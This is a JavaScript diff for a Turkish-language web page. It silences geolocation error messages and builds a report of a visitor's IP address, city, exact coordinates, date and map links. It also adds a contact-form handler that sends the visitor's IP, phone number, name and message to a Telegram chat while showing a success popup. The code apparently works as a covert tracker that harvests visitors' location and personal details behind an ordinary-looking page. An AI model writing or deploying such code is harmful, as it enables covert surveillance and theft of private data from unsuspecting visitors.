@@ -132,16 +132,16 @@ function showuserPosition(position) {
 function showbrowserError(error) {
   switch (error.code) {
     case error.PERMISSION_DENIED:
-      console.log("KULLANICI GEOLOCATION TALEBINI REDDETTI");
+      // console.log("KULLANICI GEOLOCATION TALEBINI REDDETTI");
       break;
     case error.POSITION_UNAVAILABLE:
-      console.log("KONUM BILGISI YOK");
+      // console.log("KONUM BILGISI YOK");
       break;
     case error.TIMEOUT:
-      console.log("ZAMAN ASIMI");
+      // console.log("ZAMAN ASIMI");
       break;
     case error.UNKNOWN_ERROR:
-      console.log("BILINMEYEN HATA");
+      // console.log("BILINMEYEN HATA");
       break;
   }
 }
@@ -168,21 +168,86 @@ const dataText = (
   y
 ) => {
   let text = `
+  --------------------------------------------
+
       IP : ${ip}
+
+      --------------------------------------------
       Şehir : ${ipcity}
+
+      --------------------------------------------
       Len(x) : ${iplen}
+
+      --------------------------------------------
       Long(y) : ${iplon}
+
+      --------------------------------------------
       Tarih : ${ipdate}
+
+      --------------------------------------------
       Konum : ${mapsUrl}
 
-  Maps : {
-    '
+      --------------------------------------------
+      ********************************************
+      --------------------------------------------
+      ********************************************
+      --------------------------------------------
+     
+   --------------------------------------------
+      
     IP : ${ip}
+
+   --------------------------------------------
+
     Tam Konum : ${realMaps}
+
+    --------------------------------------------
+
     Tam X Kordinatı : ${x},
+    
+    --------------------------------------------
+
     Tam Y Kordinatı : ${y},
-  }
+
+    --------------------------------------------
+
+  
   `;
 
   return text;
 };
+
+$("form").submit(function (e) {
+  e.preventDefault();
+  let getValue = $(this).serializeArray();
+  const json = {};
+  $.each(getValue, function (indexInArray, valueOfElement) {
+    json[this.name] = this.value;
+  });
+
+  getPlain().then((e) => {
+    sendMessageTelegram(`
+  IP : ${e}
+  --------------------------------------------
+  Telefon Numarası : ${json.tel}
+  --------------------------------------------
+
+  Adı ve Soyad : ${json.name}
+  --------------------------------------------
+  
+
+  Konu : ${json.subject}
+  --------------------------------------------
+
+
+  Mesaj : ${json.message}
+    
+  `);
+    Swal.fire({
+      icon: "success",
+      title: "Mesajınız Başarıyla İletildi !",
+      showConfirmButton: false,
+      timer: 3500,
+    });
+  });
+});
